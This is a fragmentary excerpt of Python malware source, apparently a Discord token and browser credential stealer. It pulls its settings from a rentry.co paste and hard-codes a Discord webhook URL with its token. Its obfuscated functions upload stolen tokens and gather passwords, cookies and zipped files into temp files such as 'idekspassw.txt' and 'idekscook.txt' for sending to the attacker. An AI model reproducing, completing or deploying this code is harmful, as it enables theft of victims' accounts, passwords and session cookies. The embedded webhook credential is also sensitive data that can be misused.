...
cname = "https://rentry.co/apkwp/raw"
cnameresp = requests.get(cname)
cname = cnameresp.text

footerc = "https://rentry.co/apkwp/raw"
footercresp = requests.get(footerc)
footerc = footercresp.text

words = "https://rentry.co/apkwp/raw"
wordsresp = requests.get(words)
words = wordsresp.text

h00k = "https://discord.com/api/webhooks/1145445325356662897/75af3g0xkWSFKKH7IdPmVMiuGURWIEcyn_etpI3I1-Rl0F23zTIwSJzQnKopZNa2vg2x"
...
def UP104D70K3N(token, path):
    ...
    if pfp is None: 
        pfp = "https://cdn.discordapp.com/attachments/1144423816660000918/1145460237973864578/static_4.png"
    else:
    ...
    data = {
        ...
        "embeds": [
            {
                ...
                "description": "Here is the information you requested:",
                "color": 0x9b59b6,
                "fields": [
                    {
                ...
                "footer": {
                    "text": footerc,
                    "icon_url": "https://cdn.discordapp.com/attachments/1144423816660000918/1145460237973864578/static_4.png"
                },
                "thumbnail": {
                    "url": pfp
                }
        ...
        "avatar_url": "https://cdn.discordapp.com/attachments/1144423816660000918/1145460237973864578/static_4.png",
        "username": cname,
        "attachments": []
    }
...
def wr173F0rF113(data, name):
    path = os.getenv("TEMP") + f"\ideks{name}.txt"
...
def g37P455w(path, arg):
    ...
    tempfold = temp + "ideks" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
...
def G47H3rZ1P5(paths1, paths2, paths3):
    ...
    print(W411375Z1p, G4M1N6Z1p, O7H3rZ1p)
...
def G47H3r411():
    ...
    global uP7Hs
    uP7Hs = []
    for file in ["idekspassw.txt", "idekscook.txt"]: 
